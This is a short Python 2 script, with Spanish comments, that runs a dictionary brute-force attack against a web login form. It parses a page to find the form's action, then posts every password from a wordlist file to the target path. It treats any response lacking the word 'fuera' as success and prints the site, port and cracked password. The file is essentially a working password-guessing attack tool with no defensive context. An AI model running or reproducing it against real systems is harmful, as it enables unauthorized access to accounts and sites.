# -*- coding: utf-8 -*-
import httplib, urllib
from HTMLParser import HTMLParser

class MyHTMLParser(HTMLParser):

	controller = "";

	def handle_starttag(self, tag, attrs):
		#print tag
		#print attrs
		if(tag == "form"):
			#print type(attrs)
			i = 0;
			for item_attr in attrs:
				# item_attr[0] representan cado uno de los atributos del formulario
				if(item_attr[0] == "action"):
					#print item_attr[1]
					#a = item_attr[1]
					self.controller = item_attr[1]
	
	def get_controller(self):
		return self.controller
		#print "Encountered a start tag:", tag

	#def handle_endtag(self, tag):
		#print "Encountered an end tag :", tag

	#def handle_data(self, data):
		#print "Encountered some data  :", data

class Analyze():
	# atributos
	site = "";
	port = "";
	conn = "";
	headers = "";
	password = "";
	path_file = "";

	# constructor
	def __init__(self, p_site, p_port, p_path_file):
		self.site = p_site;
		self.port = p_port
		self.path_file = p_path_file

	def connection(self):
		self.headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
		self.conn = httplib.HTTPConnection(self.site + ":" + self.port)
		#print self.conn

	def recognition_test(self):
		self.connection()
		#print self.site
		#print self.port
		#print self.headers
		#print self.conn
		params = urllib.urlencode({'password': 'pusToyDurmiendo'})
		self.conn.request("POST", "/index.php", params, self.headers)
		response = self.conn.getresponse()
		ver_source = response.read()
		return ver_source
		#a = self.feed(ver_source)
		#print a

	def password_attack(self, prey):
		self.connection();

		f = open(self.path_file, 'r')
		for line in f:
			password = line[:-1]
			params = urllib.urlencode({'password': password})
			self.conn.request("POST", "/"+prey, params, self.headers)
			response = self.conn.getresponse()
			ver_source = response.read()
			#print ver_source
			#print password
			#print response.status
			print(".")

			if "fuera" in ver_source:
				pass
			else:
				self.password = password
				self.print_result();
				quit();
				#print("SIII"); quit();
			
		self.conn.close()

	def print_result(self):
		print(
        "###########################################\n"
        "\t+ web site: " + self.site + "\n"
        "\t+ port: " + self.port + "\n"
        "\t+ password: " + self.password + "\n"
        "###########################################\n"
        );
    
